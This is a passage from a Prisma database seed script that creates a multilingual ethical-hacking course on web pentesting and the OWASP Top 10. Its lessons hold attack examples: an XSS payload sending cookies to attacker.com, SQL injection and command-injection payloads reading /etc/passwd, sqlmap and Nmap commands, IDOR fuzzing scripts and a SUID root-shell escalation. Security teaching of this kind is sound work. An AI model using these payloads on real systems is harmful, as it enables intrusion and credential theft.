- **Leçon 8** : Rédaction d'un Rapport d'Audit Professionnel & Correctifs de Sécurité
`

    const course2 = await prisma.course.create({
        data: {
            title: "Ethical Hacking & Pentest : Sécurité des Applications Web & OWASP Top 10",
            title_en: "Ethical Hacking & Pentesting: Web Application Security & OWASP Top 10",
            title_ar: "الاختراق الأخلاقي واختبار الاختراق: أمان تطبيقات الويب و OWASP Top 10",
            slug: slug2,
            description: "Maîtrisez les techniques du Pentesting web, découvrez et exploitez les vulnérabilités de l'OWASP Top 10, écrivez vos scripts Python d'attaque et sécurisez les applications.",
            description_en: "Master web penetration testing techniques, uncover and exploit OWASP Top 10 vulnerabilities, code custom Python exploits, and secure web applications.",
            description_ar: "إتقان تقنيات اختراق تطبيقات الويب، اكتشاف واستغلال ثغرات OWASP Top 10، كتابة أدوات الاختراق بلغة بايثون وتأمين البرمجيات.",
            fullDescription: fullDescription2,
            price: 0,
            isFree: true,
            isPublished: true,
            level: "Intermédiaire",
            duration: "16h 30m",
            image: "/courses/ro_simplex_graph.png",
            learningOutcomes: JSON.stringify(learningOutcomes2),
            learningOutcomes_en: JSON.stringify(learningOutcomes2_en),
            learningOutcomes_ar: JSON.stringify(learningOutcomes2_ar),
            requirements: JSON.stringify(requirements2),
            requirements_en: JSON.stringify(requirements2_en),
            requirements_ar: JSON.stringify(requirements2_ar),
            lessons: {
                create: [
                    {
                        order: 1,
                        title: "Leçon 1 : Fondations du Pentesting Éthique & Méthodologie PTES",
                        title_en: "Lesson 1: Ethical Hacking Foundations & PTES Methodology",
                        title_ar: "الدرس 1: أساسيات الاختراق الأخلاقي ومنهجية PTES",
                        duration: 100,
                        isFree: true,
                        content: `# Leçon 1 : Fondations du Pentesting Éthique & Méthodologie PTES\n\n## 1. Cadres Légaux et Déontologie de l'Ethical Hacking\n\nLe test de pénétration éthique (Pentest) se distingue des attaques malveillantes par un élément fondamental : **L'Autorisation Écrite (Ordre de Mission)**.\n\n- Sans ordre de mission signé, toute tentative d'intrusion dans un système informatique est un délit pénal grave.\n- Types de Pentests :\n  - **Black Box (Boîte Noire)** : Le pentester n'a aucune information préalable sur le système cible.\n  - **Grey Box (Boîte Grise)** : Le pentester possède un compte utilisateur classique et une documentation partielle.\n  - **White Box (Boîte Blanche)** : Accès complet au code source et à l'architecture réseau.\n\n---\n\n## 2. Les 7 Phases de la Méthodologie PTES (Penetration Testing Execution Standard)\n\n1. **Pre-engagement Interactions** (Périmètre, règles d'engagement).\n2. **Intelligence Gathering** (Reconnaissance OSINT).\n3. **Threat Modeling** (Modélisation des risques).\n4. **Vulnerability Analysis** (Recherche de failles).\n5. **Exploitation** (Gain d'accès au système).\n6. **Post-Exploitation** (Maintien d'accès, pivotement, élévation de privilèges).\n7. **Reporting** (Rapport d'audit pour le client).\n\n---\n\n## 3. Configuration de l'Environnement de Travail (Kali Linux & Burp Suite)\n\n\`\`\`bash\n# Mise à jour des outils de sécurité sous Kali Linux\nsudo apt update && sudo apt upgrade -y\n\n# Lancement du proxy d'interception Burp Suite\nburpsuite &\n\`\`\``
                    },
                    {
                        order: 2,
                        title: "Leçon 2 : Reconnaissance, Cartographie & Scanner de Réseau (Nmap, OSINT)",
                        title_en: "Lesson 2: Reconnaissance, Network Mapping & Scanning (Nmap, OSINT)",
                        title_ar: "الدرس 2: الاستطلاع، رسم الخرائط وفحص الشبكات (Nmap، OSINT)",
                        duration: 125,
                        isFree: true,
                        content: `# Leçon 2 : Reconnaissance, Cartographie & Scanner de Réseau (Nmap, OSINT)\n\n## 1. Reconnaissance Passive (OSINT)\n\nLa reconnaissance passive consiste à collecter des informations stratégiques sans envoyer de paquets directement détectables sur le serveur de la cible :\n- Recherche de sous-domaines (\`sublist3r\`, \`amass\`).\n- Analyse des enregistrements DNS (DNSENUM, WHOIS).\n- Détection des technologies web utilisées (Wappalyzer).\n\n---\n\n## 2. Scans Actifs Avancés avec Nmap\n\n\`\`\`bash\n# 1. Scan complet de tous les ports TCP (1-65535) en mode rapide SYN Scan\nsudo nmap -sS -p- -T4 --min-rate 1000 192.168.1.50 -oN scan_ports.txt\n\n# 2. Scan détaillé des versions de services (-sV) et scripts de détection (-sC)\nsudo nmap -sC -sV -p 22,80,443,3306 192.168.1.50 -oN scan_services.txt\n\n# 3. Scan de vulnérabilités spécifiques avec les scripts NSE\nsudo nmap --script vuln -p 80,443 192.168.1.50\n\`\`\`\n\n---\n\n## 3. Fuzzing de Répertoires Web Cachés avec Gobuster / ffuf\n\n\`\`\`bash\n# Recherche des répertoires cachés sur un serveur web\ngobuster dir -u http://target.elsayf.local -w /usr/share/wordlists/dirb/common.txt -x php,html,js,json\n\`\`\``
                    },
                    {
                        order: 3,
                        title: "Leçon 3 : OWASP Top 10 (Partie 1) - SQL Injections (SQLi) & Bypass d'Auth",
                        title_en: "Lesson 3: OWASP Top 10 (Part 1) - SQL Injection (SQLi) & Auth Bypass",
                        title_ar: "الدرس 3: OWASP Top 10 (الجزء 1) - ثغرات SQLi والتخطي للمصادقة",
                        duration: 140,
                        isFree: false,
                        content: `# Leçon 3 : OWASP Top 10 (Partie 1) - SQL Injections (SQLi) & Bypass d'Auth\n\n## 1. Comprendre la Vulnérabilité SQL Injection\n\nL'injection SQL survient lorsque des données saisies par un utilisateur sont directement concaténées dans une requête SQL sans être nettoyées ni préparées.\n\n\`\`\`sql\n-- Code vulnérable (PHP) :\n-- $query = "SELECT * FROM users WHERE email = '" . $_POST['email'] . "' AND password = '" . $_POST['password'] . "'";\n\n-- Payload de Bypass d'Authentification :\n-- Utilisateur saisit : admin@elsayf.click' --\n-- La requête exécutée devient :\nSELECT * FROM users WHERE email = 'admin@elsayf.click' --' AND password = '...' \n\`\`\`\n\n---\n\n## 2. Automatisation avec SQLMap\n\n\`\`\`bash\n# Test automatisé d'un formulaire de recherche vulnérable\nsqlmap -u "http://target.elsayf.local/search.php?id=1" --batch --dbs\n\n# Extraction des tables de la base de données\nsqlmap -u "http://target.elsayf.local/search.php?id=1" -D elsayf_db --tables\n\`\`\`\n\n---\n\n## 3. Correctif Securisé : Requêtes Préparées (PDO / ORM)\n\n\`\`\`php\n// Code Securisé (PHP PDO) :\n$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email AND password = :pass');\n$stmt->execute(['email' => $email, 'pass' => $hashedPassword]);\n$user = $stmt->fetch();\n\`\`\``
                    },
                    {
                        order: 4,
                        title: "Leçon 4 : OWASP Top 10 (Partie 2) - Cross-Site Scripting (XSS), CSRF & SSRF",
                        title_en: "Lesson 4: OWASP Top 10 (Part 2) - XSS, CSRF & SSRF Vulnerabilities",
                        title_ar: "الدرس 4: OWASP Top 10 (الجزء 2) - ثغرات XSS، CSRF و SSRF",
                        duration: 135,
                        isFree: false,
                        content: `# Leçon 4 : OWASP Top 10 (Partie 2) - Cross-Site Scripting (XSS), CSRF & SSRF\n\n## 1. Types de Cross-Site Scripting (XSS)\n\n- **XSS Refléché (Reflected XSS)** : Le script malveillant est exécuté immédiatement depuis le lien transmis à la victime.\n- **XSS Stocké (Stored XSS)** : Le script est enregistré en base de données (ex: commentaire d'un forum) et exécuté sur le navigateur de chaque visiteur.\n- **DOM-Based XSS** : Exécution du script directement par la manipulation d'objets du DOM JavaScript côté client.\n\n\`\`\`html\n<!-- Exemple de payload d'exfiltration de cookies de session -->\n<script>\n  fetch('http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));\n</script>\n\`\`\`\n\n---\n\n## 2. Server-Side Request Forgery (SSRF)\n\nLe SSRF permet à un attaquant de forcer l'application web à envoyer une requête HTTP vers un serveur interne non accessible depuis l'extérieur (ex: métadonnées AWS \`http://169.254.169.254/latest/meta-data/\`).\n\n---\n\n## 3. Correctif : Sanitization & Content Security Policy (CSP)\n\n\`\`\`html\n<!-- En-tête HTTP Content Security Policy (CSP) recommandé -->\nContent-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;\n\`\`\``
                    },
                    {
                        order: 5,
                        title: "Leçon 5 : OWASP Top 10 (Partie 3) - Command Injection (RCE), IDOR & Access Control",
                        title_en: "Lesson 5: Command Injection (RCE), IDOR & Broken Access Control",
                        title_ar: "الدرس 5: تنفيذ الأوامر البعيد RCE، ثغرات IDOR والتحكم في الوصول",
                        duration: 140,
                        isFree: false,
                        content: `# Leçon 5 : Command Injection (RCE), IDOR & Broken Access Control\n\n## 1. Injection de Commandes Système (RCE - Remote Code Execution)\n\nSurvient lorsqu'une application exécute des commandes système (ex: \`system()\`, \`exec()\`) avec des entrées utilisateur non assainies.\n\n\`\`\`php\n// Exemple de code PHP vulnérable :\n// $ip = $_GET['ip'];\n// system("ping -c 1 " . $ip);\n\n// Payload de l'attaquant dans le paramètre IP :\n// 127.0.0.1; cat /etc/passwd\n\`\`\`\n\n---\n\n## 2. Insecure Direct Object References (IDOR)\n\nUne vulnérabilité IDOR se produit lorsqu'une application permet d'accéder à la ressource d'un autre utilisateur en modifiant simplement un identifiant dans l'URL ou le corps de la requête.\n\n\`\`\`http\nGET /api/user/profile?userId=105 HTTP/1.1\nHost: target.elsayf.click\n\n-- Si l'attaquant change userId=105 par userId=106 et accède aux données privées d'un autre utilisateur -> IDOR !\n\`\`\`\n\n---\n\n## 3. Développement d'un Script de PoC (Proof of Concept) en Python\n\n\`\`\`python\nimport requests\n\nurl = "http://target.elsayf.local/api/invoice"\nfor invoice_id in range(1000, 1010):\n    res = requests.get(f"{url}/{invoice_id}")\n    if res.status_code == 200:\n        print(f"[+] Facture {invoice_id} accessible sans authentification !")\n\`\`\``
                    },
                    {
                        order: 6,
                        title: "Leçon 6 : Auditing d'APIs REST, Sécurité JWT & Fuzzing avec Burp Suite & Python",
                        title_en: "Lesson 6: REST API Security, JWT Security & Automated Fuzzing",
                        title_ar: "الدرس 6: أمان واجهات APIs، رموز JWT والفحص التلقائي بلغة بايثون",
                        duration: 130,
                        isFree: false,
                        content: `# Leçon 6 : Auditing d'APIs REST, Sécurité JWT & Fuzzing avec Burp Suite & Python\n\n## 1. Vulnérabilités des Tokens JWT (JSON Web Tokens)\n\nLes tokens JWT sont largement utilisés pour les applications modern SPA (Next.js/React).\nAttaques courantes sur les JWT :\n- **Attaque "None" Algorithm** : Remplacer l'algorithme dans le header par \`{"alg": "none"}\` et supprimer la signature.\n- **Attaque de clé faible** : Attaque par dictionnaire sur la clé HMAC-SHA256 avec des outils comme \`hashcat\` ou \`jwt_tool\`.\n\n---\n\n## 2. Script Python de Fuzzing d'API REST sur-mesure\n\n\`\`\`python\nimport requests\n\nBASE_URL = "http://api.elsayf.local/v1"\nHEADERS = {"Authorization": "Bearer TOKEN_EXEMPLE"}\n\n# Wordlist de paramètres API courants à fuzzer\nparams = ["admin", "debug", "test", "role", "is_admin", "user_id"]\n\nfor p in params:\n    r = requests.get(f"{BASE_URL}/users/me?{p}=true", headers=HEADERS)\n    if "admin" in r.text.lower() or r.status_code == 200:\n        print(f"🎯 Paramètre intéressant trouvé : {p} (Code status: {r.status_code})")
\`\`\``
                    },
                    {
                        order: 7,
                        title: "Leçon 7 : Élévation de Privilèges (PrivEsc Linux/Windows) & Scripting d'Exploits",
                        title_en: "Lesson 7: Local Privilege Escalation (Linux/Windows) & Exploit Scripting",
                        title_ar: "الدرس 7: رفع الصلاحيات المحلية (PrivEsc) وكتابة سكريبتات الاستغلال",
                        duration: 145,
                        isFree: false,
                        content: `# Leçon 7 : Élévation de Privilèges (PrivEsc Linux/Windows) & Scripting d'Exploits\n\n## 1. Technologique d'Élévation de Privilèges sur Linux\n\nAprès avoir obtenu un shell utilisateur initial (*Low-privilege user*), le pentester recherche des vulnérabilités locales pour devenir \`root\` :\n- **Fichiers SUID mal configurés** : Binaires possédant le bit SUID actif (\`find / -perm -4000 2>/dev/null\`).\n- **Droits Sudo excessifs** : Vérification avec \`sudo -l\`.\n- **Tâches Cron vulnérables** : Fichiers exécutés par root avec des permissions d'écriture publiques.\n\n\`\`\`bash\n# Recherche des exécutables avec le Bit SUID activé\nfind / -type f -perm -04000 -ls 2>/dev/null\n\n# Exploitation GTFOBins si /usr/bin/find possède le bit SUID :\nfind . -exec /bin/sh -p \\; -quit\n\`\`\``
                    },
                    {
                        order: 8,
                        title: "Leçon 8 : Rédaction d'un Rapport d'Audit Professionnel & Correctifs de Sécurité",
                        title_en: "Lesson 8: Professional Pentest Reporting & Remediation Guidelines",
                        title_ar: "الدرس 8: كتابة تقرير اختبار الاختراق الاحترافي وترقيع الثغرات",
                        duration: 120,
                        isFree: false,
                        content: `# Leçon 8 : Rédaction d'un Rapport d'Audit Professionnel & Correctifs de Sécurité\n\n## 1. Structure d'un Rapport d'Audit de Sécurité Professionnel\n\nUn rapport d'audit de pentest professionnel est le livrable final présenté au client. Il comporte 2 parties :\n1. **Synthèse Mangériale (Executive Summary)** : Destinée aux dirigeants (sans jargon technique), présentant le niveau de risque global et l'impact business.\n2. **Rapport Technique Détaillé** : Destiné aux développeurs et sysadmins, contenant pour chaque vulnérabilité :\n   - Intitulé et score CVSS v3.1 (ex: 8.5 CRITICAL).\n   - Preuve de concept (PoC) pas-à-pas.\n   - Impact potentiel.\n   - Recommandations de correctifs explicites avec exemples de code.\n\n---\n\n## 🏆 Projet Final : Audit de Sécurité Éthique complet d'une Application Web fictive\n\nRéalisez l'audit d'une application d'entraînement, découvrez 3 vulnérabilités clés et rédigez le rapport de pentest professionnel conforme aux normes industrielles.`
                    }
                ]
            }
        }
    })

    console.log(`✅ Formation 2 créée avec succès ! ID: ${course2.id} | Slug: ${course2.slug}`)
}

main()
    .catch((e) => {
        console.error("❌ Erreur pendant le seed :", e)
        process.exit(1)
    })
    .finally(async () => {
        await prisma.$disconnect()
    })
